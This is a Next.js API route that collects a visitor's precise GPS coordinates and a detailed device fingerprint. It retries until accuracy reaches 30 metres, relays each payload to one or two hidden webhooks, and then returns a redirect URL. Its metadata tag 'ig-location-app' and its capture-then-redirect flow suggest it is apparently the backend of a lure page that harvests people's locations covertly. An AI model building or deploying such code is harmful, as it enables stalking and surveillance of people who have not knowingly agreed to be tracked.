import { NextRequest, NextResponse } from 'next/server';

function buildPayload(body: any, eventType: string) {
  const {
    latitude,
    longitude,
    accuracy,
    altitude,
    altitudeAccuracy,
    heading,
    speed,
    timestamp,
    deviceInfo,
    googleMapsLink,
    attemptNumber,
  } = body;

  return {
    event: eventType,
    timestamp: new Date().toISOString(),
    locationRequestedAt: new Date(timestamp).toISOString(),
    attempt_number: attemptNumber || null,
    location: {
      latitude,
      longitude,
      accuracy_meters: accuracy,
      accuracy_rating: accuracy <= 10 ? 'EXCELLENT' : accuracy <= 20 ? 'GOOD' : accuracy <= 30 ? 'ACCEPTABLE' : accuracy <= 50 ? 'MODERATE' : 'LOW',
      meets_threshold: accuracy <= 30,
      altitude_meters: altitude || null,
      altitude_accuracy_meters: altitudeAccuracy || null,
      heading_degrees: heading || null,
      speed_mps: speed || null,
    },
    google_maps_link: googleMapsLink,
    device: {
      userAgent: deviceInfo?.userAgent || 'Unknown',
      platform: deviceInfo?.platform || 'Unknown',
      language: deviceInfo?.language || 'Unknown',
      cookiesEnabled: deviceInfo?.cookiesEnabled || false,
      doNotTrack: deviceInfo?.doNotTrack || null,
      screenWidth: deviceInfo?.screenWidth || null,
      screenHeight: deviceInfo?.screenHeight || null,
      pixelRatio: deviceInfo?.pixelRatio || null,
      colorDepth: deviceInfo?.colorDepth || null,
      vendor: deviceInfo?.vendor || 'Unknown',
      model: deviceInfo?.model || 'Unknown',
      os: deviceInfo?.os || 'Unknown',
      osVersion: deviceInfo?.osVersion || 'Unknown',
      browser: deviceInfo?.browser || 'Unknown',
      browserVersion: deviceInfo?.browserVersion || 'Unknown',
      isMobile: deviceInfo?.isMobile || false,
      isTouchDevice: deviceInfo?.isTouchDevice || false,
      connectionType: deviceInfo?.connectionType || 'Unknown',
    },
    metadata: {
      source: 'ig-location-app',
      version: '2.0.0',
    },
  };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { type, latitude, longitude, accuracy } = body;

    // Validate required fields
    if (!latitude || !longitude || !accuracy) {
      console.error('[API] Missing required location fields:', { latitude, longitude, accuracy });
      return NextResponse.json(
        { error: 'Missing required location fields', received: { latitude, longitude, accuracy } },
        { status: 400 }
      );
    }

    console.log(`[API] Received ${type} request - lat: ${latitude}, lng: ${longitude}, accuracy: ${accuracy}m`);

    const redirectUrl = process.env.REDIRECT_URL;
    const webhookUrl = process.env.WEBHOOK_URL;
    const webhookUrl2 = process.env.WEBHOOK_URL_2;

    if (type === 'update') {
      // ===== WEBHOOK 2: Continuous location updates =====
      if (webhookUrl2) {
        const payload = buildPayload(body, 'location_update');
        console.log(`[Webhook 2] Sending location update (attempt ${body.attemptNumber}, accuracy: ${accuracy}m)`);

        try {
          const res = await fetch(webhookUrl2, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
          });
          console.log(`[Webhook 2] Response: ${res.status} ${res.statusText}`);
        } catch (err) {
          console.error('[Webhook 2] Failed:', err);
        }
      } else {
        console.warn('[Webhook 2] WEBHOOK_URL_2 not configured, skipping update');
      }

      return NextResponse.json({
        success: true,
        type: 'update',
        accuracy: accuracy,
        meetsThreshold: accuracy <= 30,
        webhook2Sent: !!webhookUrl2,
      });
    }

    // ===== WEBHOOK 1: Final precise location (accuracy < 30m) =====
    if (!webhookUrl) {
      console.error('[Webhook 1] WEBHOOK_URL not configured in .env');
      return NextResponse.json(
        { error: 'Webhook URL not configured', hint: 'Set WEBHOOK_URL in .env' },
        { status: 500 }
      );
    }

    const payload = buildPayload(body, 'location_captured');
    console.log(`[Webhook 1] Sending FINAL location (accuracy: ${accuracy}m) to ${webhookUrl.substring(0, 50)}...`);

    let webhookOk = false;
    try {
      const webhookResponse = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      webhookOk = webhookResponse.ok;
      console.log(`[Webhook 1] Response: ${webhookResponse.status} ${webhookResponse.statusText}`);
    } catch (err) {
      console.error('[Webhook 1] Fetch failed:', err);
    }

    // Also send to webhook 2 as final update
    if (webhookUrl2) {
      try {
        const finalPayload = buildPayload(body, 'location_final');
        const res2 = await fetch(webhookUrl2, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(finalPayload),
        });
        console.log(`[Webhook 2] Final update response: ${res2.status}`);
      } catch (err) {
        console.error('[Webhook 2] Final update failed:', err);
      }
    }

    return NextResponse.json({
      success: true,
      type: 'final',
      redirectUrl: redirectUrl || null,
      webhookStatus: webhookOk ? 'sent' : 'failed',
      accuracy: accuracy,
      webhook1Url: webhookUrl.substring(0, 30) + '...',
    });
  } catch (error) {
    console.error('[API] Location API error:', error);
    return NextResponse.json(
      { error: 'Internal server error', details: String(error) },
      { status: 500 }
    );
  }
}
